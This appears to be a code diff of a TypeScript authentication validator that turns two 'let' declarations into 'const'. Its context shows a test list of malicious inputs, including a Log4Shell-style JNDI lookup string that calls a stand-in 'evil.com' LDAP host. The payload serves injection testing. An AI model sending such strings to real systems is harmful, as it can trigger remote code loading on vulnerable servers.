@@ -692,7 +692,7 @@ class AuthenticationValidator {
         "${jndi:ldap://evil.com/a}"
       ];
 
-      let vulnerableToInjection = false;
+      const vulnerableToInjection = false;
       for (const input of maliciousInputs) {
         try {
           // Test if malicious input causes any issues in user creation
@@ -803,7 +803,7 @@ class AuthenticationValidator {
     try {
       // Test environment variable handling
       const requiredEnvVars = ['JWT_SECRET', 'SESSION_SECRET'];
-      let missingVars: string[] = [];
+      const missingVars: string[] = [];
 
       for (const envVar of requiredEnvVars) {
         if (!process.env[envVar] && !this.config?.[envVar]) {
